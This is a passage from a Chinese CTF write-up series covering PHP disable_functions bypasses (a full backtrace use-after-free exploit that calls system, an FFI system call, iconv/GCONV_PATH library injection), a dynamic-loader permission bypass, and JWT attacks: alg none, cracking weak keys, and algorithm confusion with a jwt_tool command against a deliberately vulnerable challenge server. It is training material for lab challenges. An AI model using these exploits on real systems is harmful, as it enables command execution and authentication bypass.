            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle(str_repeat('A', 79));

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);
    exit();
}
-
蚁剑链接
![Backtrace UAF 1](/ctfhub/images/web18.png)
上传exploit
![Backtrace UAF 2](/ctfhub/images/web19.png)
访问exploit
![Backtrace UAF 3](/ctfhub/images/web20.png)

8.FFI扩展
FFI（Foreign Function Interface）,即外部函数接口。是指在一种语言里调用另一种语言代码的技术。PHP在7.4版本中新增加了此扩展,PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。FFI的使用只需声明和调用两步。
Linux操作系统
PHP>=7.4
开启了FFI扩展且ffi.enable=true
exploit:
<?php
    $ffi = FFI::cdef("int system(const char *command);");   # 声明ffi,调用system函数
    $ffi->system("tac /flag > /var/www/html/flag.txt");   # 执行命令读取flag
    echo file_get_contents("/var/www/html/flag.txt");
    // @unlink("/var/www/html/flag.txt");    # 删除flag.txt文件
?>
-
蚁剑连接
![FFI扩展 1](/ctfhub/images/web21.png)
上传exploit
![FFI扩展 2](/ctfhub/images/web22.png)
getflag
![FFI扩展 3](/ctfhub/images/web23.png)

9.iconv
php在执行iconv函数时,实际上是调用glibc中的iconv相关函数,其中一个很重要的函数叫做iconv_open()
linux系统提供了一个环境变量:GCONV_PATH,该环境变量能够使glibc使用用户自定义的gconv-modules文件,因此,如果指定了GCONV_PATH的值,iconv_open函数的执行过程会如下:
1.iconv_open函数依照GCONV_PATH找到gconv-modules文件,这个文件中包含了各个字符集的相关信息存储的路径,每个字符集的相关信息存储在一个.so文件中,即gconv-modules文件提供了各个字符集的.so文件所在位置。
2.根据gconv-modules文件的指示找到参数对应的.so文件。
3.调用.so文件中的gconv()和gonv_init()函数。
4.一些其他步骤。
我们的利用方式就是首先在某一文件夹（一般是/tmp）中上传gconv-modules文件,文件中指定我们自定义的字符集文件的.so,然后我们再在.so文件中的gonv_init()函数中书写命令执行函数,之后上传php的shell,内容是使用php设定GCONV_PATH指向我们的]gconv-modules文件,然后使用iconv函数使我们的恶意代码执行。
Linux操作系统
putenv可用
PHP安装了iconv相关模块
存在可写的目录,需要上传.so文件
-
现在来看题目,首先上传gconv-modules文件到/tmp
![iconv 1](/ctfhub/images/iconv1.png)
编写payload编译成.so文件,上传到正确的目录/tmp
![iconv 2](/ctfhub/images/iconv2.png)
上传exp.php后访问获得flag
![iconv 3](/ctfhub/images/iconv3.png)
![iconv 4](/ctfhub/images/iconv4.png)

10.bypass iconv 1
phpinfo看一下,发现禁了iconv函数,但我们还能用iconv_strlen函数
![bypass iconv 1 1](/ctfhub/images/iconv5.png)
改一改exp.php就行
![bypass iconv 1 2](/ctfhub/images/iconv6.png)

11.bypass iconv 2
这次再用phpinfo看一下,发现禁了一大堆iconv函数,但没有关系,可以使用file_get_contents和fopen的convert.iconv过滤器
![bypass iconv 2 1](/ctfhub/images/iconv7.png)
继续改一改payload就没问题
![bypass iconv 2 2](/ctfhub/images/iconv8.png)

Linux
1.动态加载器
Linux ELF Dynaamic Loader,即Linux ELF动态加载器。动态加载是一种机制,通过该机制,计算机程序可以在运行时将库(或其他二进制)加载到存储器中,检索包含在库中的函数和变量的地址,执行那些函数或访问那些变量,以及从存储器中卸载库。它是计算机程序使用其他软件的三种机制之一,另外两种是静态链接和动态链接。与静态链接和动态链接不同,动态加载允许计算机程序在缺少这些库的情况下启动,以发现可用的库,并潜在地获得附加功能。
而在Linux中,通过readelf -e命令查看执行文件,可以从Program Headers中看到文件类型信息,其中Requesting program interpreter: /lib64/ld-linux-x86-64.so.2指明该文件使用的是动态加载,还可以用ldd命令查看文件依赖关系。
/lib64/ld-linux-x86-64.so.2则是Linux中用于64位ELF可执行文件的动态链接器。它加载可执行文件,解析并加载程序依赖的动态库,设置内存布局,同时还将控制权交给程序的入口点。它本身是一个可执行文件,具有执行权限,不仅可以由内核自动调用,也可以手动调用。当直接运行动态链接器并传递一个ELF文件作为参数时,动态链接器会读取文件的ELF头,解析其依赖和入口点,加载所有需要的动态库并执行ELF文件的代码。
-
连接到webshell,可以看到flag文件是644权限,不具备执行权限。
![动态加载器 1](/ctfhub/images/linux1.png)
通常,内核在执行可执行文件时,会首先检查文件权限,如果权限不足,则会拒绝执行。但通过/lib64/ld-linux-x86-64.so.2执行flag文件,实际执行的是动态链接器,readflag只是作为参数传递。动态链接器加载ELF文件只需要读取权限,而不需要目标文件有执行权限,
![动态加载器 2](/ctfhub/images/linux2.png)
本质上在执行./readflag时,shell会调用execve来执行这个程序,此时,内核会检查程序权限并调用动态链接器,如果权限不足则拒绝执行。但通过直接手动调用动态链接器则跳过了内核的权限检查

JSON Web Token
什么是JWT
Json Web Token (JWT),是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（[RFC 7519](https://tools.ietf.org/html/rfc7519)。
该token被设计为紧凑且安全的,特别适用于分布式站点的单点登录（SSO）场景,是目前最流行的跨域认证解决方案。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息,以便于从资源服务器获取资源,也可以增加一些额外的其它业务逻辑所必须的声明信息,该token也可直接被用于认证,也可被加密。
JWT的原理
JWT的原理是,服务器认证以后,生成一个JSON对象,发回给用户,就像下面这样。
```JSON
{
  "姓名": "张三",
  "角色": "管理员",
  "到期时间": "2018年7月1日0点0分"
}
```
以后,用户与服务端通信的时候,都要发回这个JSON对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据,服务器在生成这个对象的时候,会加上签名（详见后文）。
服务器就不保存任何session数据了,也就是说,服务器变成无状态了,从而比较容易实现扩展。
JWT的数据结构
实际当中JWT长这个样子:
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0.Y2PuC-D6SfCRpsPN19_1Sb4WPJNkJr7lhG6YzA8-9OQ
```
它是一个很长的字符串,中间用点（.）分隔成三个部分。注意,JWT内部是没有换行的
JWT的三个部分依次如下:
- Header（头部）
- Payload（负载）
- Signature（签名）
写成一行，就是下面的样子。
```text
Header.Payload.Signature
```
每个部分最后都会使用base64URLEncode方式进行编码
```Python
#!/usr/bin/env python
function base64url_encode($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
} 
```
Header
Header部分是一个JSON对象,描述JWT的元数据,以上面的例子,使用base64decode之后:
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```
```JSON
{
  "alg": "HS256",
  "typ": "JWT"
}
```
header部分最常用的两个字段是alg和typ。
alg属性表示token签名的算法(algorithm),最常用的为HMAC和RSA算法
typ属性表示这个token的类型（type）,JWT令牌统一写为JWT。
Payload
Payload部分也是一个JSON对象,用来存放实际需要传递的数据。JWT规定了7个官方字段供选用。
- iss (issuer)：签发人
- exp (expiration time)：过期时间
- sub (subject)：主题
- aud (audience)：受众
- nbf (Not Before)：生效时间
- iat (Issued At)：签发时间
- jti (JWT ID)：编号
除了官方字段,还可以在这个部分定义私有字段,以上面的例子为例,将payload部分解base64之后:
```text
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0
```
```JSON
{
  "sub": "1234567890",
  "name": "CTFHub",
  "iat": 1516239022
}
```
注意:JWT默认是不会对Payload加密的,也就意味着任何人都可以读到这部分JSON的内容,所以不要将私密的信息放在这个部分
Signature
Signature部分是对前两部分的签名,防止数据篡改
首先,需要指定一个密钥（secret）。这个密钥只有服务器才知道,不能泄露给用户。然后,使用Header里面指定的签名算法（默认是 HMAC SHA256）,按照下面的公式产生签名。
```JSON
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```
算出签名以后,把Header、Payload、Signature三个部分拼成一个字符串,每个部分之间用"点"（.）分隔,就可以返回给用户。

1.敏感信息泄露
抓包获得token
![敏感信息泄露 1](/ctfhub/images/jwt1.png)
JWT的header与payload默认不加密,使用base64编码,如果将敏感信息存储在其中很容易造成敏感信息泄露
![敏感信息泄露 2](/ctfhub/images/jwt2.png)

2.无签名
无签名,即不使用签名算法,当alg字段为空时,后端将不执行签名验证。因此抓包获取token
![无签名 1](/ctfhub/images/jwt3.png)
解码header和payload,将其中的alg字段改为none,再重新base64编码回去
![无签名 2](/ctfhub/images/jwt4.png)
重发修改后的包
![无签名 3](/ctfhub/images/jwt5.png)

3.弱密钥
jwt利用工具有jwt_tool(验证、伪造和破解JWT令牌)、jwt-cracker(破解HS256密钥JWT)、c-jwt-cracker等等。
因此我们可以使用jwt-cracker来破解对称加密的JWT令牌。
首先抓包获取token
![弱密钥 1](/ctfhub/images/jwt6.png)
使用jwt-cracker破解密钥
![弱密钥 2](/ctfhub/images/jwt7.png)
通过密钥修改包
![弱密钥 3](/ctfhub/images/jwt8.png)
重发包获得flag
![弱密钥 4](/ctfhub/images/jwt9.png)

4.修改签名算法
有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时,有时攻击者可以获取到公钥
此时可通过修改JWT头部的签名算法,将非对称密码算法改为对称密码算法,从而达到攻击者目的。
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <title>CTFHub JWTDemo</title>
        <link rel="stylesheet" href="/static/style.css" />
    </head>
    <body>
        <main id="content">
            <header>Web Login</header>
            <form id="login-form" method="POST">
                <input type="text" name="username" placeholder="Username" />
                <input type="password" name="password" placeholder="Password" />
                <input type="submit" name="action" value="Login" />
            </form>
            <a href="/publickey.pem">publickey.pem</a>
        </main>
        <?php echo $_COOKIE['token'];?>
        <hr/>
    </body>
</html>

<?php
require __DIR__ . '/vendor/autoload.php';
use \Firebase\JWT\JWT;

class JWTHelper {
  public static function encode($payload=array(), $key='', $alg='HS256') {
    return JWT::encode($payload, $key, $alg);
  }
  public static function decode($token, $key, $alg='HS256') {
    try{
            $header = JWTHelper::getHeader($token);
            $algs = array_merge(array($header->alg, $alg));
      return JWT::decode($token, $key, $algs);
    } catch(Exception $e){
      return false;
    }
    }
    public static function getHeader($jwt) {
        $tks = explode('.', $jwt);
        list($headb64, $bodyb64, $cryptob64) = $tks;
        $header = JWT::jsonDecode(JWT::urlsafeB64Decode($headb64));
        return $header;
    }
}

$FLAG = getenv("FLAG");
$PRIVATE_KEY = file_get_contents("/privatekey.pem");
$PUBLIC_KEY = file_get_contents("./publickey.pem");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['username']) && !empty($_POST['password'])) {
        $token = "";
        if($_POST['username'] === 'admin' && $_POST['password'] === $FLAG){
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'admin',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        } else {
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'guest',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        }
        @setcookie("token", $token, time()+1800);
        header("Location: /index.php");
        exit();
    } else {
        @setcookie("token", "");
        header("Location: /index.php");
        exit();
    }
} else {
    if(!empty($_COOKIE['token']) && JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY) != false) {
        $obj = JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY);
        if ($obj->role === 'admin') {
            echo $FLAG;
        }
    } else {
        show_source(__FILE__);
    }
}
?>
打开题目可以看到有一段代码审计,大意是根据JWT的role来决定是否输出flag。同时$algs = array_merge(array($header->alg, $alg));
这段代码允许头部指定加密算法,默认算法是RS256,如果头部指定其他算法,服务器也会接受。因此可以伪造JWT
python jwt_tool.py -I -hc "alg:HS256" -pc "username:admin,role:admin" -k publickey.pem
![修改签名算法 1](/ctfhub/images/jwt10.png)
重发包获得flag
![修改签名算法 2](/ctfhub/images/jwt11.png)